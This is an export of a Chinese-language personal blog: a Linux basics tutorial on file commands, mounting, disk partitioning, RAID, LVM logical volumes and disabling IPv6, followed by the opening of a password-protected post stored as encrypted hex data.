<p>可以使用–brief参数来确认两个文件是否不同，还可以使用-c参数来详细比较出多个文件的差异之处</p>
<h2 id="目录管理命令"><a href="#目录管理命令" class="headerlink" title="目录管理命令"></a>目录管理命令</h2><h4 id="touch命令"><a href="#touch命令" class="headerlink" title="touch命令"></a>touch命令</h4><p>touch命令用于创建空白文件或设置文件的时间，格式为“touch [选项] [文件]”。</p>
<h4 id="mkdir命令"><a href="#mkdir命令" class="headerlink" title="mkdir命令"></a>mkdir命令</h4><p>mkdir命令用于创建空白的目录，格式为“mkdir [选项]目录”。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir -p  递归创建目录</span><br></pre></td></tr></table></figure>
<h4 id="cp命令"><a href="#cp命令" class="headerlink" title="cp命令"></a>cp命令</h4><p>cp命令用于复制文件或目录，格式为“cp [选项]源文件 目标文件”。</p>
<p>cp命令参数以及作用：</p>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014200319909.png" alt="image-20201014200319909"></p>
<h4 id="mv命令"><a href="#mv命令" class="headerlink" title="mv命令"></a>mv命令</h4><p>mv命令用于剪切文件或将文件重命名，格式为“mv [选项]源文件 [目标路径|目标文件名]”。</p>
<h4 id="rm命令"><a href="#rm命令" class="headerlink" title="rm命令"></a>rm命令</h4><p>rm命令用于删除文件或目录，格式为“rm [选项]文件”。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm -rf 彻底删除</span><br></pre></td></tr></table></figure>
<h4 id="file命令"><a href="#file命令" class="headerlink" title="file命令"></a>file命令</h4><p>file命令用于查看文件的类型，格式为“file文件名”。</p>
<h2 id="打包压缩命令"><a href="#打包压缩命令" class="headerlink" title="打包压缩命令"></a>打包压缩命令</h2><h4 id="tar命令"><a href="#tar命令" class="headerlink" title="tar命令"></a>tar命令</h4><p>tar命令用于对文件进行打包压缩或解压，格式为“tar [选项] [文件]”。</p>
<p>tar命令参数及作用：</p>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014200921988.png" alt="image-20201014200921988"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-c 用于创建压缩文件</span><br><span class="line"></span><br><span class="line">-x 用于解压文件</span><br><span class="line"></span><br><span class="line">-C 用于指定要解压到哪个指定的目录</span><br><span class="line"></span><br><span class="line">-f 必须放到参数的最后一位，代表要压缩或解压的软件包名称</span><br><span class="line"></span><br><span class="line">-v 不断显示压缩或解压的过程</span><br><span class="line"></span><br><span class="line">tar zxvf  x.tar.gz 解压缩</span><br><span class="line">tar zcvf  etc.tar.gz  压缩</span><br></pre></td></tr></table></figure>
<h4 id="grep命令"><a href="#grep命令" class="headerlink" title="grep命令"></a>grep命令</h4><p>grep命令用于在文本中执行关键词搜索，并显示匹配的结果，格式为“grep [选项] [文件]”。grep命令的参数及其作用如下所示。</p>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014201401666.png" alt="image-20201014201401666"></p>
<h4 id="find命令"><a href="#find命令" class="headerlink" title="find命令"></a>find命令</h4><p>find命令用于按照指定条件来查找文件，格式为“find [查找路径]寻找条件 操作”。</p>
<p>find命令中的参数及作用：</p>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014201458583.png" alt="image-20201014201458583"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-exec    用于把find命令搜索到的结果交由紧随其后的命令作进一步处理</span><br></pre></td></tr></table></figure>
<h2 id="树形结构"><a href="#树形结构" class="headerlink" title="树形结构"></a>树形结构</h2><p>在Linux系统中，目录、字符设备、块设备、套接字、打印机等都被抽象成了文件。</p>
<p>Linux系统中的一切文件都是从“根（/）”目录开始的，并按照文件系统层次化标准（FHS）采用树形结构来存放文件，以及定义了常见目录的用途。另外，Linux系统中的文件和目录名称是严格区分大小写的。例如，root、rOOt、Root、rooT均代表不同的目录，并且文件名称中不得包含斜杠（/）。Linux系统中的文件存储结构如图：</p>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014201745499.png" alt="image-20201014201745499"></p>
<p>Linux系统中常见的目录名称以及相应内容：</p>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014201822553.png" alt="image-20201014201822553"></p>
<h2 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h2><p>Linux最常见的文件系统：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ext3：是一款日志文件系统，能够在系统异常宕机时避免文件系统资料丢失，并能自动修复数据的不一致与错误。</span><br><span class="line"></span><br><span class="line">Ext4:Ext3的改进版本,支持的存储容量高达1EB。</span><br><span class="line"></span><br><span class="line">XFS：是一种高性能的日志文件系统，而且是RHEL 7中默认的文件管理系统，它的优势在可以快速地恢复可能被破坏的文件，最大可支持的存储容量为18EB。</span><br></pre></td></tr></table></figure>
<h2 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h2><h4 id="mount命令"><a href="#mount命令" class="headerlink" title="mount命令"></a>mount命令</h4><p>mount命令用于挂载文件系统，格式为“mount文件系统 挂载目录”。mount命令中可用的参数及作用如下：</p>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014202423980.png" alt="image-20201014202423980"></p>
<p>如果想让硬件设备和目录永久地进行自动关联，就必须把挂载信息按照指定的填写格式“设备文件   挂载目录  格式类型  权限选项   自检   优先级”写入到/etc/fstab文件中。</p>
<p>各字段代表含义：</p>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014202609337.png" alt="image-20201014202609337"></p>
<p>想将文件系统为ext4的硬件设备/dev/sdb2在开机后自动挂载到/backup目录上，并保持默认权限且无需开机自检，就需要在/etc/fstab文件中写入下面的信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;fstab</span><br><span class="line"></span><br><span class="line">&#x2F;dev&#x2F;sdb2   &#x2F;backup   ext4   defaults  0 0</span><br></pre></td></tr></table></figure>
<h4 id="umount命令"><a href="#umount命令" class="headerlink" title="umount命令"></a>umount命令</h4><p>umount命令用于撤销已经挂载的设备文件，格式为“umount [挂载点/设备文件]”。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">umount  &#x2F;dev&#x2F;sdb2</span><br></pre></td></tr></table></figure>
<h2 id="新硬盘初始化"><a href="#新硬盘初始化" class="headerlink" title="新硬盘初始化"></a>新硬盘初始化</h2><h4 id="fdisk命令"><a href="#fdisk命令" class="headerlink" title="fdisk命令"></a>fdisk命令</h4><p>fdisk命令用于管理磁盘分区，格式为“fdisk [磁盘名称]”，它提供了集添加、删除、转换分区等功能于一身。</p>
<p>fdisk命令中的参数及作用：</p>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014203146079.png" alt="image-20201014203146079"></p>
<h4 id="管理新硬盘"><a href="#管理新硬盘" class="headerlink" title="管理新硬盘"></a>管理新硬盘</h4><p>如管理/dev/sdb硬盘设备</p>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014203324621.png" alt="image-20201014203324621"></p>
<p>输入参数n添加新的分区。系统会要求选择继续输入参数p来创建主分区，还是输入参数e来创建扩展分区。这里输入参数p来创建一个主分区：</p>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014203412483.png" alt="image-20201014203412483"></p>
<p>在确认创建一个主分区后，系统要求先输入主分区的编号。主分区的编号范围是1～4，输入默认的1即可。接下来系统会提示定义起始的扇区位置，这不需要改动，敲击回车键保留默认设置即可。</p>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014203540816.png" alt="image-20201014203540816"></p>
<p>再次使用参数p来查看硬盘设备中的分区信息。果然就能看到一个名称为/dev/sdb1、起始扇区位置为2048、结束扇区位置为4196351的主分区了。这时候千万不要直接关闭窗口，而应该敲击参数w后回车，这样分区信息才是真正的写入成功啦。</p>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014203639568.png" alt="image-20201014203639568"></p>
<p>如果硬件存储设备没有进行格式化，则Linux系统无法写入数据。因此，在对存储设备进行分区后还需要进行格式化操作。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkfs.xfs &#x2F;dev&#x2F;sdb1</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014203809697.png" alt="image-20201014203809697"></p>
<p>挂载并使用存储设备了。与之相关的步骤也非常简单：首先是创建一个用于挂载设备的挂载点目录；然后使用mount命令将存储设备与挂载点进行关联；最后使用df -h命令来查看挂载状态和硬盘使用量信息。</p>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014203904081.png" alt="image-20201014203904081"></p>
<p>最后将挂载目录写到fstab中:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;fstab</span><br><span class="line"></span><br><span class="line">&#x2F;dev&#x2F;sdb2   &#x2F;backup   xfs   defaults  0 0</span><br></pre></td></tr></table></figure>
<h2 id="RAID-独立冗余磁盘阵列"><a href="#RAID-独立冗余磁盘阵列" class="headerlink" title="RAID(独立冗余磁盘阵列)"></a>RAID(独立冗余磁盘阵列)</h2><p>由于硬盘设备需要进行持续、频繁、大量的IO操作，相较于其他设备，其损坏几率也大幅增加，导致重要数据丢失的几率也随之增加。</p>
<p>RAID技术通过把多个硬盘设备组合成一个容量更大、安全性更好的磁盘阵列，并把数据切割成多个区段后分别存放在各个不同的物理硬盘设备上，然后利用分散读写技术来提升磁盘阵列整体的性能，同时把多个重要数据的副本同步到不同的物理硬盘设备上，从而起到了非常好的数据冗余备份效果。</p>
<h4 id="RAID0"><a href="#RAID0" class="headerlink" title="RAID0"></a>RAID0</h4><p>RAID 0技术把多块物理硬盘设备（至少两块）通过硬件或软件的方式串联在一起，组成一个大的卷组，并将数据依次写入到各个物理硬盘中。这样一来，在最理想的状态下，硬盘设备的读写性能会提升数倍，但是若任意一块硬盘发生故障将导致整个系统的数据都受到破坏。通俗来说，RAID 0技术能够有效地提升硬盘数据的吞吐速度，但是不具备数据备份和错误修复能力。</p>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014204634126.png" alt="image-20201014204634126"></p>
<h4 id="RAID1"><a href="#RAID1" class="headerlink" title="RAID1"></a>RAID1</h4><p>RAID 1是把两块以上的硬盘设备进行绑定，在写入数据时，是将数据同时写入到多块硬盘设备上（可以将其视为数据的镜像或备份）。当其中某一块硬盘发生故障后，一般会立即自动以热交换的方式来恢复数据的正常使用。</p>
<p>RAID 1技术虽然十分注重数据的安全性，但是因为是在多块硬盘设备中写入了相同的数据，因此硬盘设备的利用率得以下降，从理论上来说，两块硬盘空间的真实可用率只有50%，由三块硬盘设备组成的RAID 1磁盘阵列的可用率只有33%左右，以此类推。</p>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014204829583.png" alt="image-20201014204829583"></p>
<h4 id="RAID5"><a href="#RAID5" class="headerlink" title="RAID5"></a>RAID5</h4><p>RAID5技术是把硬盘设备的数据奇偶校验信息保存到其他硬盘设备中。RAID 5磁盘阵列组中数据的奇偶校验信息并不是单独保存到某一块硬盘设备中，而是存储到除自身以外的其他每一块硬盘设备上，这样的好处是其中任何一设备损坏后不至于出现致命缺陷；存放的为数据的奇偶校验信息，换句话说，就是RAID 5技术实际上没有备份硬盘中的真实数据信息，而是当硬盘设备出现问题后通过奇偶校验信息来尝试重建损坏的数据。RAID这样的技术特性“妥协”地兼顾了硬盘设备的读写速度、数据安全性与存储成本问题。</p>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014205012323.png" alt="image-20201014205012323"></p>
<h4 id="RAID10"><a href="#RAID10" class="headerlink" title="RAID10"></a>RAID10</h4><p> RAID 10技术是RAID 1+RAID 0技术的一个“组合体”。RAID 10技术需要至少4块硬盘来组建，其中先分别两两制作成RAID 1磁盘阵列，以保证数据的安全性；然后再对两个RAID 1磁盘阵列实施RAID 0技术，进一步提高硬盘设备的读写速度。这样从理论上来讲，只要坏的不是同一组中的所有硬盘，那么最多可以损坏50%的硬盘设备而不丢失数据。由于RAID 10技术继承了RAID 0的高读写速度和RAID 1的数据安全性，在不考虑成本的情况下RAID 10的性能都超过了RAID 5，因此当前成为广泛使用的一种存储技术。</p>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014205315935.png" alt="image-20201014205315935"></p>
<h2 id="LVM逻辑卷"><a href="#LVM逻辑卷" class="headerlink" title="LVM逻辑卷"></a>LVM逻辑卷</h2><h4 id="LVM技术"><a href="#LVM技术" class="headerlink" title="LVM技术"></a>LVM技术</h4><p>逻辑卷管理器是Linux系统用于对硬盘分区进行管理的一种机制，理论性较强，其创建初衷是为了解决硬盘设备在创建分区后不易修改分区大小的缺陷。尽管对传统的硬盘分区进行强制扩容或缩容从理论上来讲是可行的，但是却可能造成数据的丢失。而LVM技术是在硬盘分区和文件系统之间添加了一个逻辑层，它提供了一个抽象的卷组，可以把多块硬盘进行卷组合并。这样一来，用户不必关心物理硬盘设备的低层架构和布局，就可以实现对硬盘分区的动态调整。</p>
<p>LVM技术架构如图：</p>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014205517502.png" alt="image-20201014205517502"></p>
<p>物理卷处于LVM中的最底层，可以将其理解为物理硬盘、硬盘分区或者RAID磁盘阵列，这都可以。卷组建立在物理卷之上，一个卷组可以包含多个物理卷，而且在卷组创建之后也可以继续向其中添加新的物理卷。逻辑卷是用卷组中空闲的资源建立的，并且逻辑卷在建立后可以动态地扩展或缩小空间。这就是LVM的核心理念。</p>
<h4 id="部署逻辑卷"><a href="#部署逻辑卷" class="headerlink" title="部署逻辑卷"></a>部署逻辑卷</h4><p>常用的LVM部署命令：</p>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014205812792.png" alt="image-20201014205812792"></p>
<p>先对这两块新硬盘进行创建物理卷的操作，可以将该操作简单理解成让硬盘设备支持LVM技术，或者理解成是把硬盘设备加入到LVM技术可用的硬件资源池中，然后对这两块硬盘进行卷组合并，卷组的名称可以由用户来自定义。接下来，根据需求把合并后的卷组切割出一个约为150MB的逻辑卷设备，最后把这个逻辑卷设备格式化成EXT4文件系统后挂载使用。</p>
<p>第1步：让新添加的两块硬盘设备支持LVM技术。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pvcreate  &#x2F;dev&#x2F;sdb &#x2F;dev&#x2F;sdc</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201015095211198.png" alt="image-20201015095211198"></p>
<p>第2步：把两块硬盘设备加入到storage卷组中，然后查看卷组的状态。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vgcreate storge  &#x2F;dev&#x2F;sdb  &#x2F;dev&#x2F;sdc</span><br><span class="line">vgdisplay  #查看vg卷组状态</span><br></pre></td></tr></table></figure>
<p>第3步：切割出一个约为150MB的逻辑卷设备。</p>
<p>这里需要注意切割单位的问题。在对逻辑卷进行切割时有两种计量单位。第一种是以容量为单位，所使用的参数为-L。例如，使用-L 150M生成一个大小为150MB的逻辑卷。另外一种是以基本单元的个数为单位，所使用的参数为-l。每个基本单元的大小默认为4MB。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lvcreate -n  vo -l 37 storge  #创建了大小为37x4大小名为vo的逻辑卷</span><br><span class="line">lvdisplay   #查看lv逻辑卷状态</span><br></pre></td></tr></table></figure>
<p>第4步：把生成好的逻辑卷进行格式化，然后挂载使用。</p>
<p>Linux系统会把LVM中的逻辑卷设备存放在/dev设备目录中（实际上是做了一个符号链接），同时会以卷组的名称来建立一个目录，其中保存了逻辑卷的设备映射文件（即/dev/卷组名称/逻辑卷名称）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkfs.ext4  &#x2F;dev&#x2F;storge&#x2F;vo   #&#x2F;dev&#x2F;卷组名称&#x2F;逻辑卷名称</span><br><span class="line">mkdir &#x2F;data</span><br><span class="line">mount &#x2F;dev&#x2F;storge&#x2F;vo  &#x2F;data</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201015102706619.png" alt="image-20201015102706619"></p>
<p>第5步：查看挂载状态，并写入到配置文件，使其永久生效。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df -h</span><br><span class="line">echo &quot;dev&#x2F;storge&#x2F;vo  &#x2F;data  ext4  defaults 0 0&quot; &gt;&gt; &#x2F;etc&#x2F;fstab</span><br></pre></td></tr></table></figure>
<h4 id="扩容逻辑卷"><a href="#扩容逻辑卷" class="headerlink" title="扩容逻辑卷"></a>扩容逻辑卷</h4><p>只要卷组中有足够的资源，就可以一直为逻辑卷扩容。扩展前一定要记得卸载设备和挂载点的关联。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">umount &#x2F;data</span><br></pre></td></tr></table></figure>
<p>第1步：把逻辑卷vo扩展至290MB。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lvextend -L 290M &#x2F;dev&#x2F;storge&#x2F;vo</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201015103350087.png" alt="image-20201015103350087"></p>
<p>第2步：检查硬盘完整性，并重置硬盘容量。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">e2fsck -f  &#x2F;dev&#x2F;storge&#x2F;vo  #检查硬盘完整性</span><br><span class="line"></span><br><span class="line">resize2fs  &#x2F;dev&#x2F;storge&#x2F;vo  #重置硬盘容量</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201015103723401.png" alt="image-20201015103723401"></p>
<p>第3步：重新挂载硬盘设备并查看挂载状态。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount -a</span><br><span class="line">df -h</span><br></pre></td></tr></table></figure>
<h4 id="逻辑卷快照"><a href="#逻辑卷快照" class="headerlink" title="逻辑卷快照"></a>逻辑卷快照</h4><p>LVM还具备有“快照卷”功能，该功能类似于虚拟机软件的还原时间点功能。例如，可以对某一个逻辑卷设备做一次快照，如果日后发现数据被改错了，就可以利用之前做好的快照卷进行覆盖还原。LVM的快照卷功能有两个特点：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">快照卷的容量必须等同于逻辑卷的容量</span><br><span class="line"></span><br><span class="line">快照卷仅一次有效，一旦执行还原操作后则会立即删除</span><br></pre></td></tr></table></figure>
<p>首先查看卷组的信息。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vgdisplay</span><br></pre></td></tr></table></figure>
<p>第1步：使用-s参数生成一个快照卷，使用-L参数指定切割的大小。另外，还需要在命令后面写上是针对哪个逻辑卷执行的快照操作。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lvcreate -L 120M -s -n SNAP &#x2F;dev&#x2F;storge&#x2F;vo</span><br><span class="line">lvdisplay</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201015105039050.png" alt="image-20201015105039050"></p>
<p>第2步：在逻辑卷所挂载的目录中创建一个100MB的垃圾文件，然后再查看快照卷的状态。可以发现存储空间占的用量上升了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dd if&#x3D;&#x2F;dev&#x2F;zero  of&#x3D;linux&#x2F;files  count&#x3D;1  bs&#x3D;100M</span><br><span class="line">lvdisplay</span><br></pre></td></tr></table></figure>
<p>第3步：为了校验SNAP快照卷的效果，需要对逻辑卷进行快照还原操作。在此之前记得先卸载掉逻辑卷设备与目录的挂载。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">umount &#x2F;data</span><br><span class="line"></span><br><span class="line">lvconvert  --merge &#x2F;dev&#x2F;storge&#x2F;SNAP</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201015105435927.png" alt="image-20201015105435927"></p>
<p>第4步：快照卷会被自动删除掉。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount -a</span><br></pre></td></tr></table></figure>
<h4 id="删除逻辑卷"><a href="#删除逻辑卷" class="headerlink" title="删除逻辑卷"></a>删除逻辑卷</h4><p>当生产环境中想要重新部署LVM或者不再需要使用LVM时，则需要执行LVM的删除操作。为此，需要提前备份好重要的数据信息，然后依次删除逻辑卷、卷组、物理卷设备，这个顺序不可颠倒。</p>
<p>第1步：取消逻辑卷与目录的挂载关联，删除配置文件中永久生效的设备参数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">umount  &#x2F;data</span><br><span class="line">vim  &#x2F;etc&#x2F;fstab</span><br></pre></td></tr></table></figure>
<p>第2步：删除逻辑卷设备，需要输入y来确认操作。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lvremove  &#x2F;dev&#x2F;storge&#x2F;vo</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201015110242342.png" alt="image-20201015110242342"></p>
<p>第3步：删除卷组，此处只写卷组名称即可，不需要设备的绝对路径。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vgremove storge</span><br></pre></td></tr></table></figure>
<p>第4步：删除物理卷设备</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pvremove  &#x2F;dev&#x2F;sdb  &#x2F;dev&#x2F;sdc</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201015110441450.png" alt="image-20201015110441450"></p>
<p>在上述操作执行完毕之后，再执行lvdisplay、vgdisplay、pvdisplay命令来查看LVM的信息时就不会再看到信息了。</p>
<h2 id="禁用IPV6"><a href="#禁用IPV6" class="headerlink" title="禁用IPV6"></a>禁用IPV6</h2><p>IPv6早在上个世纪90年代，它就已经诞生了。IPv6全称Internet Protocol version 6，是网际协议的最新版本，用作互联网的协议。用它来取代IPv4主要是为了解决IPv4地址枯竭问题，同时它也在其他方面对于IPv4有许多改进。</p>
<h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>RHEL7.3</p>
<h4 id="更改配置"><a href="#更改配置" class="headerlink" title="更改配置"></a>更改配置</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;sysctl.conf </span><br><span class="line"></span><br><span class="line"># sysctl settings are defined through files in</span><br><span class="line"># &#x2F;usr&#x2F;lib&#x2F;sysctl.d&#x2F;, &#x2F;run&#x2F;sysctl.d&#x2F;, and &#x2F;etc&#x2F;sysctl.d&#x2F;.</span><br><span class="line">#</span><br><span class="line"># Vendors settings live in &#x2F;usr&#x2F;lib&#x2F;sysctl.d&#x2F;.</span><br><span class="line"># To override a whole file, create a new file with the same in</span><br><span class="line"># &#x2F;etc&#x2F;sysctl.d&#x2F; and put new settings there. To override</span><br><span class="line"># only specific settings, add a file with a lexically later</span><br><span class="line"># name in &#x2F;etc&#x2F;sysctl.d&#x2F; and put new settings there.</span><br><span class="line">#</span><br><span class="line"># For more information, see sysctl.conf(5) and sysctl.d(5).</span><br><span class="line"></span><br><span class="line">net.ipv6.conf.all.disable_ipv6 &#x3D; 1</span><br><span class="line">net.ipv6.conf.default.disable_ipv6 &#x3D; 1</span><br><span class="line"></span><br><span class="line">sysctl -p  #让配置文件立即生效</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux系统安全</category>
      </categories>
      <tags>
        <tag>Linux加固</tag>
      </tags>
  </entry>
  <entry>
    <title>博客文章加密</title>
    <url>/2020/10/14/%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0%E5%8A%A0%E5%AF%86/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">此处输入密码</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="c7834b167d6a0e44919c3decac9539d05a28066001a8732ad9b7e6e626d01162">753ca762744ce41a3b758f64d2c9e2cac54ebb0e04572651dd1a728a4c13c995014a638bc7ff4202e16b046432dc55c89089ca00d92d69b4b9b4e52cc776f9df47e1fc8ea00b6556017a75b0a77ba4e9ba0e45c034176100ba05cbd153c7b1391dfab6a698d8dbe553242c0758b0011d4c5d66f29f72ab93d7f2ab0b38a241ff830122b4dfac407896a45e0ce8a585140e0949a36f2b23fe062e032fe4cd25a5566b8b64cf28cc5baefc7cf50af124ef776f2ed1504f4849697a066e74905aac431e74a62ac033b0e6e4d6fef74bf89c181702f36b868d56798903330e6f05004505ff2223585b8e5ee5f802ea1be588d4c9577bfa7a9e8c141aad46d45d3875db0d2c310df006096a297e7d2550c62e60d5b335dcfec475c2c68d4017571bcd79a79e6f9973bdebdcb9e8b568d604ef71dc1730c957f19d4b2933e1a16c3cdea1e197f42aff4bd999c57b5b0f43ffe93e0ab9d8cded174cdb443435d7c173221abbbb332a63aa4f768b1894448531d0a55592f35810c0d33e33d64ef6ecd64d7909cd975908eaaf8007d64d6adbadd381656789bf04422f531cdc7b01936fa554c8b420fab18ddd3546bccfa98ed618c8d649eac9f5740d813eb05b1790308e14abc370f19630ecc8a01680af528120327afe26e053fe1d0da51a711019ce2c9cb997e9f7e568e95992ce9a974f49f028a802067383db0e90325d0c433d7785f93d66b0814bf7f971b369193052617267c6ba208a44dfa05ad1f20fd5d212dcd2d8ecfcdb28f689b1d0d9184d5994f2db888bf0c3b54e8de01b15bbd5b752e619eae26cedb8db95edc17449fa4fa8897612addfab05a03d35d578630c0976696c8787d1482cb9347d1619b7e64b712b5796fa4aee9ec068994f12267ff9bec48338c1fcc82b0907de506f2a5b62de91a59d112bb7e263037c9bf1397faff35b552e4c371bee805ba2c0559b4210cc3ca76b66ef54d1553b6b33b9a34e0c6504c97ecb43f5b7124cc7cc16ea992f5312a03f5e8cb3e04b64218df5006c4c4cdcf8e444ee05b3a05fa8efb3321148e30c7dcfc3d9e21129f8222b50b5bd6a18419850896619f9b77a8f14fe6a043913be6c5d6d625a13636fb31d459da969533d401da725fa5c1bdec4d8caf5ec4b20f3fb38482eec4d52d6158721ac0c401d5662ff88fd466ee42b8b45ac8e1d42784e311dca048d6aa6e86603efd3bce3af55dcfa1de747558c15040100479faa84cfaffc56e28f2f6e084c6d7c65cd2a5def446e2dafbfa442a40a24afaf9d35c8b559a0c972d9ab622a0dbb8264b63845e50e320862c0fd3e98fe300eb2977b713c34de068c72dba87f27c6027fca4b299877b272c134238ad4d29aaf95eed899520e09662625d43f6b93c24d706700f160fb14f5bed3ade311987b6430471bafd59958c3f88e09d662cc56d5a2ef14636250332fcf8ba8595635dd687b2230159d5b1eb0e140ccdde6ba5b45735ad468c3d594b93ee4b22aa52e9a50ae0809d2d49bdcab990379e23b4860cfe79d70411de9ebf00989ff1b5f4c1445684c8dbc481537676f3aec5e163433ec2bdeff00fbc34eb747eb8281fda4f620b914d3aa487a6646d72ac4cda9f6c7134bd3bdd7813661e7369ea74c642f63bbc07f8a9824e95c6ed2ebb88db83b405f8801cc6f9a8c817a020206893ec8f8480e51a4b0b356df7770b4087a4dafbb88586798bb6355ceeab2372b07246598a1efcd9059517d0fe692857cafffb1b6e4003854130a49ccc9a2b4801e64b8c052d5a1bcf3ff4480887d7f70a2134ae13fb2a2d1c98ea6b55552ca2ecb76da13206fdb80e53c9024b8d48c73587bdc15b918f6a94160c1bbabd5ce04a1dee20d1bd7e2d146ff4d72ceb656c8bd12fac3e074dd1bb627c4c4ff2fca8d51f1e670a12451efb2abe598137c95ca19208d081209aa70fa0797f6e3fbfbf0fa2203057d531e61414f1535ca9c42fba9d490956c866bf6c7d4cad98e4b203968e7448eb9d7c67a7dcabbcd441e7cff37e6bcecdfb82d6acc1ee56aef0a8e431c976bc19c403a73874bfe8e9d8d56a4f401ae503e0f70c36f1a1c8872d2525e8439b39445b7b6ce1b170674ad5f83340ffca7593e8f173a6d364a159569d03b7b66ac5c161e2c345b3401b3ce0a8b2bd0e4b04706ace6439f544c807dbaa36fe1711241231ffd6f1d34cf2541e142e4ddabfae0fa3b3c8f129104bc80c9d8c86fb7f156392e90afaf145c72fe21309f64356acb6c30061676378c0fdceb84b7d87f284fe0bdd3337d4c46a4792142526a5e4878c0733c4055cdb83f2907cf8f9c3c7247aa290ed42139c1c64eb393428ce2d06686922ca3f6c7a350cc4161fe80d1f5ab31966610474039cdac646e2034ccec41b385a06cb849f3d994f487fc8f8a2321e84e96a990b8c43970179144a61277d65194244222b3a1644158297ada73275970c77601035ed27ea15b5dfacc3eaed464c163b0ccc489655db153e9a5cd4d93667d438de0e4bbb57a7fcf6fe3d6573540ad9bf8db5236bfacdc09b81ad1b0fb7c2811c531aff80a6360fc8feb38db8fed93c2ecf4f63a6a770e5e29fc7628c1f956ce38b0c25e1e70814882e3640f49f9667788105e74a74fb54c3d482484a5afdaf2717ddbcd90b27e7a89307f1d492dbe901277cf03a7711a9ccdeec8f253ed026cbc9021d4c01d9795976dc4c67ccf5aabf72901dc685fab01ba7838d8837506f5f9173a059336d2810381114c4c5fa22ccc6f48bbe6bb725d23ad9bf8028512271e753bbd3c872152c990f881c73073d2bcb00f7c6c0a97d71c82f9a